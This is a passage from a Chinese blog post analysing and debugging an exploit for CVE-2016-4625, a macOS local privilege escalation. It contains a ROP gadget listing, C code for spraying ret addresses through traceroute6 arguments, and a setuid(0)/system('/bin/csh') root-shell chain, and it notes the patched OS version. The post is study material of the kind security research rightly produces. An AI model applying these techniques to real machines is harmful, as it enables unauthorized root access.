<p>【1】设置 traceroute6 的错误参数<br>【1】处的参数执行完以后给 parent 足够的时间来将 目标进程中 DATA段中__cleanup 函数指针覆盖为 一段gadget 的地址（此时shellcode 的地址还不能确定）, 就是步骤<a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">4</a>中找到的 gadget 的地址。<br>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">// 0x7fffa333ab47 &lt;+1908&gt;: addq   $0x1d98, %rsp        </div><div class="line">// 0x7fffa333ab4e &lt;+1915&gt;: popq   %rbx</div><div class="line">// 0x7fffa333ab4f &lt;+1916&gt;: popq   %r12</div><div class="line">// 0x7fffa333ab51 &lt;+1918&gt;: popq   %r13</div><div class="line">// 0x7fffa333ab53 &lt;+1920&gt;: popq   %r14</div><div class="line">// 0x7fffa333ab55 &lt;+1922&gt;: popq   %r15</div><div class="line">// 0x7fffa333ab57 &lt;+1924&gt;: popq   %rbp</div><div class="line">// 0x7fffa333ab58 &lt;+1925&gt;: retq</div></pre></td></tr></table></figure></p>
<p>这里 作者预测了tracerouter6 的栈帧长度是 0x948，</p>
<p>【2】处将 ret slide 拷贝到 argv s 参数列表。<br>在调试的过程中发现 x86-64位机器系统库加载的地址从0x00007fff000000000开始偏移小余4G，所以所有 gadget 指令地址都包含2个NULL字节，因为argvs 默认以 NULL 字符结尾所以第二个 NULL 会被认为没有参数了，这样就无法在栈上喷射大量的 ret指令。这里通过使用2个参数指针来指向一个 ret 地址的方法来解决这个问题。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">target_argv[argn++] = &amp;args[0];</div><div class="line">  for(int i = 1; i &lt; target_argv_rop_size; i++) &#123;</div><div class="line">    if (args[i-1] == 0) &#123;</div><div class="line">      target_argv[argn++] = &amp;args[i];</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>这段代码实现了将 shellcode 内存地址 传递给 argv 指针，同时为了防止出现连续2个 null 字节的情况，将2个连续的 null字节（第二个）保存到了2个 argv 指针中。<br>说明：这段实现要提前检查 ret 地址中 null 字节的个数，null 字节不能超过2个否则 ret地址会被截断。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int count_nulls(uint64_t val) &#123;</div><div class="line">  int nulls = 0;</div><div class="line">  uint8_t* bytes = (uint8_t*)&amp;val;</div><div class="line">  for (int i = 0; i &lt; 8; i++)&#123;</div><div class="line">    if (bytes[i] == 0) &#123;</div><div class="line">      nulls++;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return nulls;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>【0】这里是提权的 shellcode， 先将自生uid 设置成 root 用户，然后开启一个终端这个终端默认是 root 用户并且不能自动降低权限。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">setuid(0);  //将当前进程设置为 root</div><div class="line">    pop rdi   ; 参数 为0</div><div class="line">    ret       ; setuid</div><div class="line"></div><div class="line">system(“/bin/csh”);</div><div class="line">    pop rdi   ; 参数 为’/bin/csh’</div><div class="line">    ret       ; system</div></pre></td></tr></table></figure></p>
<p>最后来张图看下内存布局<br><img src="/include/img/4625/gadget_shellcode.jpg" alt="gadget_shellcode"></p>
<h4 id="漏洞补丁："><a href="#漏洞补丁：" class="headerlink" title="漏洞补丁："></a>漏洞补丁：</h4><p>OS X El Capitan v10.11.6 and Security Update 2016-004 </p>
<h3 id="结尾："><a href="#结尾：" class="headerlink" title="结尾："></a>结尾：</h3><p>  本文还有一些内容没有介绍，其中一些我也不清楚有些只知道皮毛。列举几个问题和待完善的地方：</p>
<ul>
<li>IOSurfaceRootUserClient 创建共享内存原语的2个函数，应该逆向分析下原理帮助定位 shellcode，同时 port IPC通信也需要分析。</li>
<li>代码中计算ret_slide_length 时候为什么要除5？</li>
<li>分析完整个 exploit 再回看漏洞本身，感觉提权的部分和漏洞的关系貌似不大；如果我在第一个创建的子进程中启动 traceroute6（先进行 port dancer 传递 child task port）,是否父进程也可以共享 tracerouter6的内存空间，如果可以后面的工作就是一样的了应该也可以提权。 这个想法有待尝试，但是失败的可能性是80% 猜测可能有权限的限制（比如系统检测到 tracerrouter6是 root用户的进程不允许普通用户共享内存）。</li>
<li>还有就是资料中用 IDA反编译 IOSurface.text 时怎么获取的结构体信息，这个模块是没有源代码的，有什么逆向的技巧吗？</li>
</ul>
<h4 id="CVE-2016-4625-的前途："><a href="#CVE-2016-4625-的前途：" class="headerlink" title="CVE-2016-4625 的前途："></a>CVE-2016-4625 的前途：</h4><p>由于除了root以外，这个bug也允许我们获得其他任何权限，所以很容易利用它来绕过OS X上的内核代码签名，并加载一个未签名的内核扩展<a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">4</a></p>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>测试机：Mac Mini<br>系统版本：OS X EI capitan 10.11.2</p>
<p><img src="/include/img/4625/test.jpg" alt="test"></p>
<h3 id="snippet"><a href="#snippet" class="headerlink" title="snippet"></a>snippet</h3><p>…</p>
<h3 id="ChangeLog"><a href="#ChangeLog" class="headerlink" title="ChangeLog"></a>ChangeLog</h3><table>
<thead>
<tr>
<th>Time</th>
<th>Change</th>
</tr>
</thead>
<tbody>
<tr>
<td>2017-03-06</td>
<td>debug exp</td>
</tr>
<tr>
<td>2017-03-07</td>
<td>write blogs</td>
</tr>
</tbody>
</table>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://bbs.pediy.com/thread-215839.htm" target="_blank" rel="external">译文</a><br><a href="https://googleprojectzero.blogspot.kr/2016/10/taskt-considered-harmful.html" target="_blank" rel="external">原文</a><br><a href="https://googleprojectzero.blogspot.jp/2016/03/race-you-to-kernel.html" target="_blank" rel="external">CVE-2016-1757的Exploit — Patching kextload</a><br><a href="http://turingh.github.io/2016/07/05/%E5%86%8D%E7%9C%8BCVE-2016-1757%E6%B5%85%E6%9E%90mach%20message%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="external">再看CVE-2016-1757浅析mach%20message的使用</a><br><a href="http://turingh.github.io/2016/10/28/task-t-considered-harmfull-analysis-P1/" target="_blank" rel="external">调试 CVE-2016-4625 exploit </a></p>
<section id="process"><div class="container"><div class="row"><div class="col-xs-12 col-sm-12 col-md-8 col-md-offset-2"><div class="timeline-centered"><div class="line"></div><div class="present">Past</div><div class="dot_tp"></div><div class="born">Now</div><div class="dot_bt"></div><div class="timeline-entry"><div class="timeline-entry-inner"><div data-wow-delay="0.2s" class="timeline-icon wow fadeInUp"><span class="number">1</span></div><div data-wow-delay="0.2s" class="timeline-label wow fadeInUp"><span class="word">2014/06/12-Start</span></div></div></div><div class="timeline-entry"><div class="timeline-entry-inner"><div data-wow-delay="0.2s" class="timeline-icon wow fadeInUp"><span class="number">2</span></div><div data-wow-delay="0.2s" class="timeline-label wow fadeInUp"><span class="word">2014/11/29-XXX</span></div></div></div><div class="timeline-entry"><div class="timeline-entry-inner"><div data-wow-delay="0.2s" class="timeline-icon wow fadeInUp"><span class="number">3</span></div><div data-wow-delay="0.2s" class="timeline-label wow fadeInUp"><span class="word">2015/02/18-DDD</span></div></div></div><div class="timeline-entry"><div class="timeline-entry-inner"><div data-wow-delay="0.2s" class="timeline-icon wow fadeInUp"><span class="number">4</span></div><div data-wow-delay="0.2s" class="timeline-label wow fadeInUp"><span class="word">More</span></div></div></div></div></div></div></div></section></div></div><div data-thread-key="2017/03/06/浅谈CVE-2016-4625-exploit/" data-title="浅谈 CVE-2016-4625 exploit" data-url="http://yoursite.com/2017/03/06/浅谈CVE-2016-4625-exploit/" data-author-key="1" class="ds-thread"></div></div></div><div class="pure-u-1 pure-u-md-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"/><input type="hidden" name="sitesearch" value="http://yoursite.com"/></form></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> 分类</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/开发/">开发</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/categories-fiddle/">捣鼓</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/categories-exploit/">漏洞</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/categories-life/">生活</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/categories-research/">研究</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/读书/">读书</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> 标签</i></div><div class="tagcloud"><a href="/tags/blackhat-2016/" style="font-size: 15px;">blackhat-2016</a> <a href="/tags/了解/" style="font-size: 15px;">了解</a> <a href="/tags/ios/" style="font-size: 15px;">ios</a> <a href="/tags/读书笔记/" style="font-size: 15px;">读书笔记</a> <a href="/tags/熟悉/" style="font-size: 15px;">熟悉</a> <a href="/tags/逻辑思维/" style="font-size: 15px;">逻辑思维</a> <a href="/tags/jeb/" style="font-size: 15px;">jeb</a> <a href="/tags/动态调试/" style="font-size: 15px;">动态调试</a> <a href="/tags/Armv8-64/" style="font-size: 15px;">Armv8-64</a> <a href="/tags/Hexo/" style="font-size: 15px;">Hexo</a> <a href="/tags/ios-osx/" style="font-size: 15px;">ios/osx</a> <a href="/tags/AppVeyor/" style="font-size: 15px;">AppVeyor</a> <a href="/tags/CI/" style="font-size: 15px;">CI</a> <a href="/tags/Git/" style="font-size: 15px;">Git</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> 最新文章</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/XNU内核设计-Kext内核扩展/">XNU内核设计--Kext内核扩展</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/3月逻辑思维/">3月逻辑思维</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/13/XNU内核设计-基础篇/">XNU内核设计--基础篇</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/09/简洁主题-Maupassant/">简洁主题--Maupassant</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/06/浅谈CVE-2016-4625-exploit/">浅谈 CVE-2016-4625 exploit</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/28/内存漏洞/">漏洞基础--内存漏洞</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/mach-port-names-函数分析/">mach_port_names 函数分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/08/iOS-roadMap/">iOS RoadMap</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/08/2016-Pwnie-Awards/">2016 Pwnie Awards</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/04/happy-new-year/">happy new year</a></li></ul></div><div class="widget"><div class="comments-title"><i class="fa fa-comment-o"> 最近评论</i></div><div data-num-items="5" data-show-avatars="0" data-show-time="1" data-show-admin="0" data-excerpt-length="32" data-show-title="1" class="ds-recent-comments"></div></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> 资源链接</i></div><ul></ul><a href="http://bbs.pediy.com/" title="看雪论坛" target="_blank">看雪论坛</a><ul></ul><a href="http://ddeville.me/" title="Damien DeVille" target="_blank">Damien DeVille</a><ul></ul><a href="http://nirvan.360.cn/blog/?cat=2" title="360Nirvan Team" target="_blank">360Nirvan Team</a><ul></ul><a href="https://googleprojectzero.blogspot.jp/" title="Project Zero" target="_blank">Project Zero</a><ul></ul><a href="http://shell-storm.org/blog/Triton-under-the-hood/" title="Jonathan Salwan" target="_blank">Jonathan Salwan</a><ul></ul><a href="http://cocoahuke.com/" title="Cocoa ‘for iOS/Mac’" target="_blank">Cocoa ‘for iOS/Mac’</a><ul></ul><a href="http://whereisk0shl.top/" title="whereisk0shl" target="_blank">whereisk0shl</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">© <a href="/." rel="nofollow">FloatingGuy's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a id="rocket" href="#top" class="show"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="/css/jquery.fancybox.css?v=0.0.0"><script>var duoshuoQuery = {short_name:'floatingguy'};
(function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
        || document.getElementsByTagName('body')[0]).appendChild(ds);
})();
</script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "//hm.baidu.com/hm.js?0550af547bfca45329cbf2afcc9fde43";
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(hm, s);
  })();
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>